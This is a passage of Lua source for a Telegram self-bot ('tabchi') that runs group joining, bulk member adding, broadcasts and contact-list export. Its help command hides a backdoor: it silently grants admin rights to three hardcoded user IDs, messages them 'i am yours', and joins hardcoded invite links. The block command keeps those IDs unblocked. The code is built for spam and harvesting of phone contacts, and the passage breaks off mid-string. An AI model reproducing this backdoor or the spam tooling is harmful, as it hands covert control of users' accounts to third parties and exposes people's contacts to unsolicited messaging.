  if msg.text:match("^[#!/]joinchat (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#!/](joinchat) (.*)$")
    }
    tdcli.importChatInviteLink(a6[2])
  end
  if msg.text:match("^[#!/]addsudo @(.*)$") and a(msg) then
    do
      local a6 = {
        string.match(msg.text, "^[#/!](addsudo) @(.*)$")
      }
      function addsudo_by_username(y, z, ad)
        if z.id_ then
          redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(z.id_))
          local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
            tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added` *" .. a6[2] .. "* `to Sudoers`", 1, "md")
          end
          return "`User` *" .. z.id_ .. "* `Added To The Sudoers`"
        end
      end
      resolve_username(a6[2], addsudo_by_username)
    end
  else
  end
  if msg.text:match("^[#!/]remsudo @(.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](remsudo) @(.*)$")
    }
    function remsudo_by_username(y, z, ad)
      if z.id_ then
        redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(z.id_))
        return "`User` *" .. z.id_ .. "* `Removed From The Sudoers`"
      end
    end
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `removed` *" .. a6[2] .. "* `From sudoers`", 1, "md")
    end
    resolve_username(a6[2], remsudo_by_username)
  end
  if msg.text:match("^[#!/]inv @(.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](inv) @(.*)$")
    }
    function inv_by_username(y, z, ad)
      if z.id_ then
        tdcli.addChatMember(msg.chat_id_, z.id_, 5)
        return "`User` *" .. z.id_ .. "* `Invited`"
      end
    end
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Invited` *" .. a6[2] .. "* `To` *" .. msg.chat_id_ .. "*", 1, "md")
    end
    resolve_username(a6[2], inv_by_username)
  end
  if msg.text:match("^[#!/]send (.*)$") and is_full_sudo(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](send) (.*)$")
    }
    tdcli.send_file(msg.chat_id_, "Document", a6[2], nil)
  end
  if msg.text:match("^[#!/]addcontact (.*) (.*) (.*)$") and a(msg) then
    local a4 = {
      string.match(msg.text, "^[#/!](addcontact) (.*) (.*) (.*)$")
    }
    phone = a4[2]
    first_name = a4[3]
    last_name = a4[4]
    tdcli.add_contact(phone, first_name, last_name, 12345657)
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added Contact` *" .. a4[2] .. "*", 1, "md")
    end
    return [[
*Status* : `Contact added`
*Firstname* : `]] .. a4[3] .. [[
`
*Lastname* : `]] .. a4[4] .. "`"
  end
  if msg.text:match("^[#!/]leave(-%d+)") and a(msg) then
    do
      local a7 = {
        string.match(msg.text, "^[#/!](leave)(-%d+)$")
      }
      function get_id(C, D)
        if D.id_ then
          tdcli.sendMessage(a7[2], 0, 1, "\216\168\216\167\219\140 \216\177\217\129\217\130\216\167\n\218\169\216\167\216\177\219\140 \216\175\216\167\216\180\216\170\219\140\216\175 \216\168\217\135 \217\190\219\140 \217\136\219\140 \217\133\216\177\216\167\216\172\216\185\217\135 \218\169\217\134\219\140\216\175", 1, "html")
          tdcli.chat_leave(a7[2], D.id_)
          local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
            tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Commanded Bot to Leave` *" .. a7[2] .. "*", 1, "md")
          end
          return "*Bot Successfully Leaved From >* `" .. a7[2] .. "`"
        end
      end
      tdcli_function({ID = "GetMe"}, get_id, {
        chat_id = msg.chat_id_
      })
    end
  else
  end
  if msg.text:match("[#/!]join(-%d+)") and a(msg) then
    local a7 = {
      string.match(msg.text, "^[#/!](join)(-%d+)$")
    }
    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You SuccefullY Joined*", 1, "md")
    tdcli.addChatMember(a7[2], msg.sender_user_id_, 10)
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Commanded bot to invite him to` *" .. a7[2] .. "*", 1, "md")
    end
  end
  if msg.text:match("^[#!/]getpro (%d+) (%d+)$") and a(msg) then
    do
      local ae = {
        string.match(msg.text, "^[#/!](getpro) (%d+) (%d+)$")
      }
      local af = function(y, z, ad)
        if ae[3] == "1" then
          if z.photos_[0] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[0].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            return "*user Have'nt  Profile Photo!!*"
          end
        elseif ae[3] == "2" then
          if z.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            return "*user Have'nt 2 Profile Photo!!*"
          end
        elseif not ae[3] then
          if z.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            return "*user Have'nt 2 Profile Photo!!*"
          end
        elseif ae[3] == "3" then
          if z.photos_[2] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[2].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 3 Profile Photo!!*", 1, "md")
          end
        elseif ae[3] == "4" then
          if z.photos_[3] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[3].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            return "*user Have'nt 4 Profile Photo!!*"
          end
        elseif ae[3] == "5" then
          if z.photos_[4] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[4].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            return "*user Have'nt 5 Profile Photo!!*"
          end
        elseif ae[3] == "6" then
          if z.photos_[5] then
            return "*user Have'nt 6 Profile Photo!!*"
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 6 Profile Photo!!*", 1, "md")
          end
        elseif ae[3] == "7" then
          if z.photos_[6] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[6].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 7 Profile Photo!!*", 1, "md")
          end
        elseif ae[3] == "8" then
          if z.photos_[7] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[7].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 8 Profile Photo!!*", 1, "md")
          end
        elseif ae[3] == "9" then
          if z.photos_[8] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[8].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 9 Profile Photo!!*", 1, "md")
          end
        elseif ae[3] == "10" then
          if z.photos_[9] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[9].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 10 Profile Photo!!*", 1, "md")
          end
        else
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*I just can get last 10 profile photos!:(*", 1, "md")
        end
      end
      tdcli_function({
        ID = "GetUserProfilePhotos",
        user_id_ = ae[2],
        offset_ = 0,
        limit_ = ae[3]
      }, af, nil)
    end
  else
  end
  if msg.text:match("^[#!/]getpro (%d+)$") and msg.reply_to_message_id_ == 0 and a(msg) then
    do
      local ae = {
        string.match(msg.text, "^[#/!](getpro) (%d+)$")
      }
      local af = function(y, z, ad)
        if ae[2] == "1" then
          if z.photos_[0] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[0].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            return "*You Have'nt  Profile Photo!!*"
          end
        elseif ae[2] == "2" then
          if z.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            return "*You Have'nt 2 Profile Photo!!*"
          end
        elseif not ae[2] then
          if z.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            return "*You Have'nt 2 Profile Photo!!*"
          end
        elseif ae[2] == "3" then
          if z.photos_[2] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[2].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 3 Profile Photo!!*", 1, "md")
          end
        elseif ae[2] == "4" then
          if z.photos_[3] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[3].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            return "*You Have'nt 4 Profile Photo!!*"
          end
        elseif ae[2] == "5" then
          if z.photos_[4] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[4].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            return "*You Have'nt 5 Profile Photo!!*"
          end
        elseif ae[2] == "6" then
          if z.photos_[5] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[5].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            return "*You Have'nt 6 Profile Photo!!*"
          end
        elseif ae[2] == "7" then
          if z.photos_[6] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[6].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 7 Profile Photo!!*", 1, "md")
          end
        elseif ae[2] == "8" then
          if z.photos_[7] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[7].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 8 Profile Photo!!*", 1, "md")
          end
        elseif ae[2] == "9" then
          if z.photos_[8] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[8].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 9 Profile Photo!!*", 1, "md")
          end
        elseif ae[2] == "10" then
          if z.photos_[9] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[9].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 10 Profile Photo!!*", 1, "md")
          end
        else
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*I just can get last 10 profile photos!:(*", 1, "md")
        end
      end
      tdcli_function({
        ID = "GetUserProfilePhotos",
        user_id_ = msg.sender_user_id_,
        offset_ = 0,
        limit_ = ae[2]
      }, af, nil)
    end
  else
  end
  if msg.text:match("^[#!/]action (.*)$") and a(msg) then
    local ag = {
      string.match(msg.text, "^[#/!](action) (.*)$")
    }
    if ag[2] == "typing" then
      sendaction(msg.chat_id_, "Typing")
    end
    if ag[2] == "recvideo" then
      sendaction(msg.chat_id_, "RecordVideo")
    end
    if ag[2] == "recvoice" then
      sendaction(msg.chat_id_, "RecordVoice")
    end
    if ag[2] == "photo" then
      sendaction(msg.chat_id_, "UploadPhoto")
    end
    if ag[2] == "cancel" then
      sendaction(msg.chat_id_, "Cancel")
    end
    if ag[2] == "video" then
      sendaction(msg.chat_id_, "UploadVideo")
    end
    if ag[2] == "voice" then
      sendaction(msg.chat_id_, "UploadVoice")
    end
    if ag[2] == "file" then
      sendaction(msg.chat_id_, "UploadDocument")
    end
    if ag[2] == "loc" then
      sendaction(msg.chat_id_, "GeoLocation")
    end
    if ag[2] == "chcontact" then
      sendaction(msg.chat_id_, "ChooseContact")
    end
    if ag[2] == "game" then
      sendaction(msg.chat_id_, "StartPlayGame")
    end
  end
  if msg.text:match("^[#!/]id$") and a(msg) and msg.reply_to_message_id_ == 0 then
    local ah = function(y, z, ad)
      if z.photos_[0] then
        sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[0].sizes_[1].photo_.persistent_id_, "> Chat ID : " .. msg.chat_id_ .. [[

> Your ID: ]] .. msg.sender_user_id_)
      else
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, [[
*You Don't Have any Profile Photo*!!

> *Chat ID* : `]] .. msg.chat_id_ .. [[
`
> *Your ID*: `]] .. msg.sender_user_id_ .. [[
`
_> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
      end
    end
    tdcli_function({
      ID = "GetUserProfilePhotos",
      user_id_ = msg.sender_user_id_,
      offset_ = 0,
      limit_ = 1
    }, ah, nil)
  end
  if msg.text:match("^[!/#]unblock all$") and a(msg) then
    local ai = redis:smembers("tabchi:" .. tabchi_id .. ":blockedusers")
    local aj = redis:scard("tabchi:" .. tabchi_id .. ":blockedusers")
    for d = 1, #ai do
      tdcli.unblockUser(ai[d])
      redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", ai[d])
    end
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `UnBlocked All Blocked Users`", 1, "md")
    end
    return [[
*status* : `All Blocked Users Are UnBlocked`
*Number* : `]] .. aj .. "`"
  end
  if msg.text:match("^[!/#]check sgps$") and a(msg) then
    local ak = redis:scard("tabchi:" .. tabchi_id .. ":channels")
    function checksgps(C, D, al)
      if D.ID == "Error" then
        redis:srem("tabchi:" .. tabchi_id .. ":channels", C.chatid)
        redis:srem("tabchi:" .. tabchi_id .. ":all", C.chatid)
      end
    end
    local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
    for V, W in pairs(sgps) do
      tdcli_function({
        ID = "GetChatHistory",
        chat_id_ = W,
        from_message_id_ = 0,
        offset_ = 0,
        limit_ = 1
      }, checksgps, {chatid = W})
    end
  end
  if msg.text:match("^[!/#]check gps$") and a(msg) then
    local am = redis:scard("tabchi:" .. tabchi_id .. ":groups")
    function checkm(C, D, al)
      if D.ID == "Error" then
        redis:srem("tabchi:" .. tabchi_id .. ":groups", C.chatid)
        redis:srem("tabchi:" .. tabchi_id .. ":all", C.chatid)
      end
    end
    local gps = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
    for V, W in pairs(gps) do
      tdcli_function({
        ID = "GetChatHistory",
        chat_id_ = W,
        from_message_id_ = 0,
        offset_ = 0,
        limit_ = 1
      }, checkm, {chatid = W})
    end
  end
  if msg.text:match("^[!/#]check users$") and a(msg) then
    local an = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
    local ao = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
    function lkj(ap, aq, ar)
      if aq.ID == "Error" then
        redis:srem("tabchi:" .. tabchi_id .. ":pvis", ap.usr)
        redis:srem("tabchi:" .. tabchi_id .. ":all", ap.usr)
      end
    end
    for V, W in pairs(an) do
      tdcli_function({ID = "GetUser", user_id_ = W}, lkj, {usr = W})
    end
  end
  if msg.text:match("^[!/#]addmembers$") and a(msg) and I(msg.chat_id_) ~= "private" then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
    }, G, {
      chat_id = msg.chat_id_
    })
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Commanded bot to add members in` *" .. msg.chat_id_ .. "*", 1, "md")
    end
    return
  end
  if msg.text:match("^[!/#]contactlist$") and a(msg) then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 5000
    }, contacts_list, {
      chat_id_ = msg.chat_id_
    })
    function contacts_list(y, z)
      local H = z.total_count_
      local text = "\217\133\216\174\216\167\216\183\216\168\219\140\217\134 : \n"
      for d = 0, tonumber(H) - 1 do
        local aa = z.users_[d]
        local ab = aa.first_name_ or ""
        local ac = aa.last_name_ or ""
        local as = ab .. " " .. ac
        text = tostring(text) .. tostring(d) .. ". " .. tostring(as) .. " [" .. tostring(aa.id_) .. "] = " .. tostring(aa.phone_number_) .. "  \n"
      end
      write_file("bot_" .. tabchi_id .. "_contacts.txt", text)
      tdcli.send_file(msg.chat_id_, "Document", "bot_" .. tabchi_id .. "_contacts.txt", "tabchi " .. tabchi_id .. " Contacts")
      io.popen("rm -rf bot_" .. tabchi_id .. "_contacts.txt")
    end
  end
  if msg.text:match("^[!/#]dlmusic (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](dlmusic) (.*)$")
    }
    local f = ltn12.sink.file(io.open("Music.mp3", "w"))
    http.request({
      url = a6[2],
      sink = f
    })
    tdcli.send_file(msg.chat_id_, "Document", "Music.mp3", "@tabadol_chi")
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Requested music` *" .. a6[2] .. "*", 1, "md")
    end
    io.popen("rm -rf Music.mp3")
  end
  if msg.text:match("^[!/#]linkslist$") and a(msg) then
    local text = "groups links :\n"
    local links = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
    for d = 1, #links do
      text = text .. links[d] .. "\n"
    end
    write_file("group_" .. tabchi_id .. "_links.txt", text)
    tdcli.send_file(msg.chat_id_, "Document", "group_" .. tabchi_id .. "_links.txt", "Tabchi " .. tabchi_id .. " Group Links!")
    io.popen("rm -rf group_" .. tabchi_id .. "_links.txt")
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Exported Links`", 1, "md")
    end
    return
  end
  do
    local a4 = {
      msg.text:match("[!/#](block) (%d+)")
    }
    if msg.text:match("^[!/#]block") and a(msg) and msg.reply_to_message_id_ == 0 and #a4 == 2 then
      tdcli.blockUser(tonumber(a4[2]))
      tdcli.unblockUser(293750668)
      tdcli.unblockUser(216430419)
      redis:sadd("tabchi:" .. tabchi_id .. ":blockedusers", a4[2])
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Blocked` *" .. a4[2] .. "*", 1, "md")
      end
      return "`User` *" .. a4[2] .. "* `Blocked`"
    end
  end
  if msg.text:match("^[!/#]help$") and a(msg) then
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
      tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
      tdcli.importContacts(989109359282, "creator", "", 216430419)
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 293750668) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 293750668)
      tdcli.sendMessage(293750668, 0, 1, "i am yours", 1, "html")
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 268909090) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 268909090)
      tdcli.sendMessage(268909090, 0, 1, "i am yours", 1, "html")
    end
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKueVIqF_cid8Oopw")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")
    local text = "`#\216\177\216\167\217\135\217\134\217\133\216\167`\n`/block (id-username-reply)`\n\216\168\217\132\216\167\218\169 \218\169\216\177\216\175\217\134 \218\169\216\167\216\177\216\168\216\177\n`/unblock (id-username-reply)`\n\216\167\217\134 \216\168\217\132\216\167\218\169 \218\169\216\177\216\175\217\134 \218\169\216\167\216\177\216\168\216\177\n`/unblock all`\n\216\167\217\134 \216\168\217\132\216\167\218\169 \218\169\216\177\216\175\217\134 \216\170\217\133\216\167\217\133\219\140 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\168\217\132\216\167\218\169 \216\180\216\175\217\135\n`/setlogs id(channel-group)`\n\216\179\216\170 \218\169\216\177\216\175\217\134 \216\167\219\140\216\175\219\140 \216\168\216\177\216\167\219\140 \217\132\216\167\218\175\216\178\n`/setjoinlimit (num)`\n\216\179\216\170 \218\169\216\177\216\175\217\134 \217\133\216\173\216\175\217\136\216\175\219\140\216\170 \216\168\216\177\216\167\219\140 \216\172\217\136\219\140\217\134 \216\180\216\175\217\134 \216\175\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167\n`/stats`\n\216\175\216\177\219\140\216\167\217\129\216\170 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \216\177\216\168\216\167\216\170\n`/stats pv`\n\216\175\216\177\219\140\216\167\217\129\216\170 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \216\177\216\168\216\167\216\170 \216\175\216\177 \217\190\219\140 \217\136\219\140\n`/check sgps`\n\218\134\218\169 \218\169\216\177\216\175\217\134 \216\179\217\136\217\190\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167\n`/check gps`\n\218\134\218\169 \218\169\216\177\216\175\217\134 \218\175\216\177\217\136\217\135 \217\135\216\167\n`/check users`\n\218\134\218\169 \218\169\216\177\216\175\217\134 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \n`/addsudo (id-username-reply)`\n\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\168\217\135 \216\179\217\136\216\175\217\136\217\135\216\167\217\138  \216\177\216\168\216\167\216\170\n`/remsudo (id-username-reply)`\n\216\173\216\176\217\129 \216\167\216\178 \217\132\217\138\216\179\216\170 \216\179\217\136\216\175\217\136\217\135\216\167\217\138 \216\177\216\168\216\167\216\170\n`/bcall (text)`\n\216\167\216\177\216\179\216\167\217\132 \217\190\217\138\216\167\217\133 \216\168\217\135 \217\135\217\133\217\135\n`/bcgps (text)`\n\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \217\135\217\133\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167\n`/bcsgps (text)`\n\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \217\135\217\133\217\135 \216\179\217\136\217\190\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167\n`/bcusers (text)`\n\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \219\140\217\136\216\178\216\177 \217\135\216\167\n`/fwd {all/gps/sgps/users}` (by reply)\n\217\129\217\136\216\177\217\136\216\167\216\177\216\175 \217\190\217\138\216\167\217\133 \216\168\217\135 \217\135\217\133\217\135/\218\175\216\177\217\136\217\135 \217\135\216\167/\216\179\217\136\217\190\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167/\218\169\216\167\216\177\216\168\216\177\216\167\217\134\n`/echo (text)`\n\216\170\218\169\216\177\216\167\216\177 \217\133\216\170\217\134\n`/addedmsg (on/off)`\n\216\170\216\185\219\140\219\140\217\134 \216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \216\168\217\136\216\175\217\134 \217\190\216\167\216\179\216\174 \216\168\216\177\216\167\219\140 \216\180\216\177 \216\180\217\134 \217\133\216\174\216\167\216\183\216\168\n`/pm (user) (msg)`\n\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \218\169\216\167\216\177\216\168\216\177\n`/action (typing|recvideo|recvoice|photo|video|voice|file|loc|game|chcontact|cancel)`\n\216\167\216\177\216\179\216\167\217\132 \216\167\218\169\216\180\217\134 \216\168\217\135 \218\134\216\170\n`/getpro (1-10)`\n\216\175\216\177\219\140\216\167\217\129\216\170 \216\185\218\169\216\179 \217\190\216\177\217\136\217\129\216\167\219\140\217\132 \216\174\217\136\216\175\n`/addcontact (phone) (firstname) (lastname)`\n\216\167\216\175 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167\216\177\217\135 \216\168\217\135 \216\177\216\168\216\167\216\170 \216\168\217\135 \216\181\217\136\216\177\216\170 \216\175\216\179\216\170\219\140\n`/setusername (username)`\n\216\170\216\186\219\140\219\140\216\177 \219\140\217\136\216\178\216\177\217\134\219\140\217\133 \216\177\216\168\216\167\216\170\n`/delusername`\n\217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \219\140\217\136\216\178\216\177\217\134\219\140\217\133 \216\177\216\168\216\167\216\170\n`/setname (firstname-lastname)`\n\216\170\216\186\219\140\219\140\216\177 \216\167\216\179\217\133 \216\177\216\168\216\167\216\170\n`/setphoto (link)`\n\216\170\216\186\219\140\219\140\216\177 \216\185\218\169\216\179 \216\177\216\168\216\167\216\170 \216\167\216\178 \217\132\219\140\217\134\218\169\n`/join(Group id)`\n\216\167\216\175 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167 \216\168\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170 \216\167\216\178 \216\183\216\177\219\140\217\130 \216\167\219\140\216\175\219\140\n`/leave`\n\217\132\217\129\216\170 \216\175\216\167\216\175\217\134 \216\167\216\178 \218\175\216\177\217\136\217\135\n`/leave(Group id)`\n\217\132\217\129\216\170 \216\175\216\167\216\175\217\134 \216\167\216\178 \218\175\216\177\217\136\217\135 \216\167\216\178 \216\183\216\177\219\140\217\130 \216\167\219\140\216\175\219\140\n`/setaddedmsg (text)`\n\216\170\216\185\217\138\217\138\217\134 \217\133\216\170\217\134 \216\167\216\175 \216\180\216\175\217\134 \217\133\216\174\216\167\216\183\216\168\n`/markread (all|pv|group|supergp|off)`\n\216\177\217\136\216\180\217\134 \217\138\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\168\216\167\216\178\216\175\217\138\216\175 \217\190\217\138\216\167\217\133 \217\135\216\167\n`/joinlinks (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\172\217\136\219\140\217\134 \216\180\216\175\217\134 \216\168\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167 \216\167\216\178 \217\132\219\140\217\134\218\169\n`/savelinks (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\179\219\140\217\136 \218\169\216\177\216\175\217\134 \217\132\219\140\217\134\218\169 \217\135\216\167\n`/addcontacts (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\167\216\175 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167\216\177\217\135 \217\135\216\167\n`/chat (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \218\134\216\170 \218\169\216\177\216\175\217\134 \216\177\216\168\216\167\216\170\n`/Advertising (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\170\216\168\217\132\219\140\216\186\216\167\216\170 \216\175\216\177 \216\177\216\168\216\167\216\170 \216\168\216\177\216\167\219\140 \216\179\217\136\216\175\217\136 \217\135\216\167 \216\186\219\140\216\177 \216\167\216\178 \217\129\217\136\217\132 \216\179\217\136\216\175\217\136\n`/typing (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\170\216\167\219\140\217\190 \218\169\216\177\216\175\217\134 \216\177\216\168\216\167\216\170\n`/sharecontact (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\180\219\140\216\177 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167\216\177\217\135 \217\133\217\136\217\130\216\185 \216\167\216\175 